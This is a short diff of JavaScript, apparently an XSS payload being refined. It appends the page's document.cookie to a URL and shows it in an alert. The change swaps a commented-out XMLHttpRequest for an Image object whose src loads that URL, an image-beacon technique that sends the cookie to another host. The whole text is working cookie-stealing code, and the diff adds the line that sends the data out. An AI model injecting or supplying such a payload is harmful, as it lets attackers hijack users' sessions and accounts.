@@ -4,7 +4,7 @@ url = url + document.cookie;
 
 alert("magic! your cookie is " + document.cookie);
 
-var xhr = new XMLHttpRequest();
-//xhr.open("GET", url, true);
+var my_image = new Image();
+my_image.src = url;
 
-alert("sent the cookie!");
+alert("loaded the image!");
